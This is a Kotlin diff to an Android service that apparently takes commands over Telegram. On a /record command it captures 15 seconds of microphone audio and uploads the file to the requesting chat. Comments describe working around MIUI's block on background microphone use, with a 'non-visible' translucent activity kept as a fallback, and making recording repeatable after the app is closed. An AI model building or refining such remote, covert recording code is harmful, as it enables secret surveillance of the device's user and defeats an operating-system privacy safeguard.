@@ -610,10 +610,15 @@ class TelegramService : Service() {
         } catch (e: Exception) { /* ignore */ }
     }
 
-    /** Rekam 15 detik audio via AudioRecorderActivity (translucent, non-visible).
-     *  MIUI memblokir mic access dari background service, tapi mengizinkan
-     *  dari app yang punya Activity di foreground. Activity ini menangani
-     *  audio focus + MediaRecorder (retry source), lalu broadcast hasil. */
+    /** Rekam 15 detik audio langsung di-service (MediaRecorder di coroutine),
+     *  TANPA launch Activity. Aktifkan foreground notification (id=2) sebagai
+     *  visible surface sah MIUI. Activity hanya di-launch fallback kalau
+     *  semua audio source gagal dari service.
+     *
+     *  Alur: audio focus → MediaRecorder retry (VOICE_RECOGNITION → MIC)
+     *  → rekam 15 detik → stop → kirim file → release focus + cancel notifikasi.
+     *  Semua state reset di finally, jadi /record ke-2 selalu bisa trigger
+     *  meski app di-background (MIUI close/swipe). */
     private suspend fun recordAudio(chatId: String) {
         if (isRecording) {
             sendText(chatId, "Sedang merekam... tunggu selesai.")
@@ -627,25 +632,134 @@ class TelegramService : Service() {
                 return
             }
         }
+        val ts = System.currentTimeMillis()
+        val outDir = getExternalFilesDir(null) ?: filesDir
+        val outFile = java.io.File(outDir, "rec_${ts}.m4a")
+        if (outFile.exists()) outFile.delete()
+        Log.d(TAG, "recordAudio: dir=${outDir.absolutePath}, file=${outFile.absolutePath}")
+
         isRecording = true
         showRecordingNotification()
-        sendText(chatId, "⏺️ Mulai rekam 15 detik... (layar sebaiknya ON)")
-        Log.d(TAG, "recordAudio: launching AudioRecorderActivity for chat=$chatId")
-        try {
-            val i = Intent(this, AudioRecorderActivity::class.java).apply {
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
-                putExtra(AudioRecorderActivity.EXTRA_CHAT_ID, chatId)
+        sendText(chatId, "⏺️ Mulai rekam 15 detik...")
+        scope?.launch {
+            val am = getSystemService(AUDIO_SERVICE) as AudioManager
+            var focusGranted = false
+
+            // --- 1. Request audio focus (wajib di MIUI) ---
+            try {
+                if (Build.VERSION.SDK_INT >= 26) {
+                    val focusReq = android.media.AudioFocusRequest.Builder(AudioManager.AUDIOFOCUS_GAIN)
+                        .setAudioAttributes(
+                            AudioAttributes.Builder()
+                                .setUsage(AudioAttributes.USAGE_MEDIA)
+                                .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
+                                .build()
+                        )
+                        .build()
+                    focusGranted = am.requestAudioFocus(focusReq) == AudioManager.AUDIOFOCUS_REQUEST_GRANTED
+                } else {
+                    @Suppress("DEPRECATION")
+                    focusGranted = am.requestAudioFocus(
+                        null, AudioManager.STREAM_MUSIC, AudioManager.AUDIOFOCUS_GAIN
+                    ) == AudioManager.AUDIOFOCUS_REQUEST_GRANTED
+                }
+                Log.d(TAG, "recordAudio: audioFocus=$focusGranted")
+            } catch (e: Exception) {
+                Log.w(TAG, "recordAudio: audioFocus fail: ${e.message}")
             }
-            startActivity(i)
-        } catch (e: Exception) {
-            Log.e(TAG, "recordAudio: startActivity fail: ${e.message}")
+
+            // --- 2. MediaRecorder retry: VOICE_RECOGNITION → MIC ---
+            var startOk = false
+            for (source in listOf(MediaRecorder.AudioSource.VOICE_RECOGNITION, MediaRecorder.AudioSource.MIC)) {
+                val rec = if (Build.VERSION.SDK_INT >= 31) {
+                    MediaRecorder(applicationContext)
+                } else {
+                    @Suppress("DEPRECATION")
+                    MediaRecorder()
+                }
+                mediaRecorder = rec
+                try {
+                    rec.setAudioSource(source)
+                    rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+                    rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+                    rec.setAudioSamplingRate(44100)
+                    rec.setAudioEncodingBitRate(96000)
+                    rec.setOutputFile(outFile.absolutePath)
+                    rec.prepare()
+                    rec.start()
+                    startOk = true
+                    Log.d(TAG, "recordAudio: started with source=$source (in-service)")
+                    break
+                } catch (e: Exception) {
+                    Log.w(TAG, "recordAudio: source=$source failed: ${e.javaClass.simpleName}: ${e.message}")
+                    try { rec.release() } catch (_: Exception) {}
+                }
+            }
+
+            // --- 3. Fallback: launch Activity kalau semua source gagal ---
+            if (!startOk) {
+                Log.w(TAG, "recordAudio: all sources failed in-service, launching AudioRecorderActivity as fallback")
+                mediaRecorder = null
+                try {
+                    val i = Intent(applicationContext, AudioRecorderActivity::class.java)
+                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+                    i.putExtra(AudioRecorderActivity.EXTRA_CHAT_ID, chatId)
+                    startActivity(i)
+                    // Activity akan broadcast ACTION_DONE/FAIL — state direset di recordResultReceiver
+                    return@launch
+                } catch (e: Exception) {
+                    Log.e(TAG, "recordAudio: fallback activity fail: ${e.message}")
+                }
+            }
+
+            // --- 4. Rekam 15 detik ---
+            delay(15_000L)
+
+            // --- 5. Stop & release ---
+            try { mediaRecorder?.stop() } catch (e: Exception) {
+                Log.w(TAG, "recordAudio: stop: ${e.message}")
+            }
+            try { mediaRecorder?.release() } catch (e: Exception) {
+                Log.w(TAG, "recordAudio: release: ${e.message}")
+            }
+            mediaRecorder = null
+
+            // --- 6. Release audio focus ---
+            if (focusGranted) {
+                try {
+                    if (Build.VERSION.SDK_INT >= 26) {
+                        val abandonReq = android.media.AudioFocusRequest.Builder(AudioManager.AUDIOFOCUS_GAIN)
+                            .setAudioAttributes(
+                                AudioAttributes.Builder()
+                                    .setUsage(AudioAttributes.USAGE_MEDIA)
+                                    .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
+                                    .build()
+                            )
+                            .build()
+                        am.abandonAudioFocusRequest(abandonReq)
+                    } else {
+                        @Suppress("DEPRECATION")
+                        am.abandonAudioFocus(null)
+                    }
+                } catch (_: Exception) {}
+            }
+
+            // --- 7. Kirim file ---
+            if (outFile.exists() && outFile.length() > 0) {
+                Log.d(TAG, "recordAudio: file=${outFile.length()} bytes, sending...")
+                sendAudio(chatId, outFile, "Rekaman ${android.text.format.DateFormat.format("HH:mm", ts)}")
+            } else {
+                sendText(chatId, "❌ File rekaman kosong (0 bytes).")
+            }
+            outFile.delete()
+
+            // --- 8. Bersihkan state ---
             isRecording = false
             hideRecordingNotification()
-            scope?.launch { sendText(chatId, "❌ Gagal launching activity rekaman: ${e.message}") }
         }
     }
 
-    /** Receiver hasil rekaman dari AudioRecorderActivity. */
+    /** Receiver hasil rekaman fallback dari AudioRecorderActivity. */
     private val recordResultReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context, intent: Intent) {
             val chatId = intent.getStringExtra(AudioRecorderActivity.EXTRA_CHAT_ID) ?: ""
